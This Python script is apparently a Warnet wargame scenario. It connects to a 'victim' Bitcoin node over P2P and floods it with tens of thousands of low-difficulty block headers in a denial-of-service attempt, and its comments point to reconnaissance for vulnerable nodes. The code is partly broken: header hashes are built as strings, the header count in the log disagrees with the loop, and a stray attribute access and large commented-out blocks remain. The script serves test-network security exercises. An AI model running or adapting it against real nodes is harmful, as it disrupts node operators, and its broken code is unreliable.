#!/usr/bin/env python3

import socket

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import MSG_TX, CInv, hash256, msg_inv
from test_framework.p2p import MAGIC_BYTES, P2PInterface
from test_framework.messages import msg_addr, CAddress, msg_headers, CBlockHeader
import random
import time
from time import sleep


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


class msg_inv2:
    __slots__ = ("inv",)
    msgtype = b"invalid"

    def __init__(self, inv=None):
        self.inv = inv

    def serialize(self):
        return b"randominvalid"


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class UnknownMessage(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate unknown message attack using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/stub_unknown_p2p.py"

    # Scenario entrypoint
    def run_test(self):
        # We pick a node on the network to attack
        # We know this one is vulnderable to an unknown messages based on it's subver
        # Use either reconnaisance or ForkObserver UI to find vulnerable nodes
        # Change this to your teams colour if running in the battleground
        # victim = "tank-0043-coffee.default.svc"
        victim = "localhost"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        print(f"[*] Sending {100000} low-difficulty headers...")
        headers_msg = msg_headers()
        previous_hash = b"\x00" * 32  # Start from an empty hash

        getblocks_message = attacker.get

        for i in range(40000):
            header = CBlockHeader()
            header.nVersion = 1
            header.hashPrevBlock = str(previous_hash)  # Chain it to previous header
            header.nTime = int(time.time())  # Fake timestamp
            header.nBits = 0x207FFFFF  # **Extremely low difficulty**
            header.nNonce = 0
            print("creating header", i)
            headers_msg.headers.append(header)
            # previous_hash = hash256(header)

            # previous_hash = 0x5f0b403001c75b6e0cd5c2f421253a4616844aed2069e24506aac48aae6b537c

            # if len(headers_msg.headers) >= 2000:  # Max batch size
                # try:
        print(f"Sending {i}")
        attacker.send_and_ping(headers_msg)
        # headers_msg = msg_headers()
            # attacker.peer_disconnect()
            # attacker.peer_connect(
                # dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
            # )()
            # attacker.wait_until(lambda: attacker.is_connected, check_connected=False)                    # sleep(10)
                # except Exception as e:
                    # print("Connection error:", e)
                    # while not attacker.is_connected:
                        # try:
                            # attacker.peer_connect(
                                # dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
                            # )()
                            # sleep(1)
                            # attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
                        # except Exception:
                            # pass
        print("[+] Headers sent successfully!")

def main():
    UnknownMessage().main()


if __name__ == "__main__":
    main()
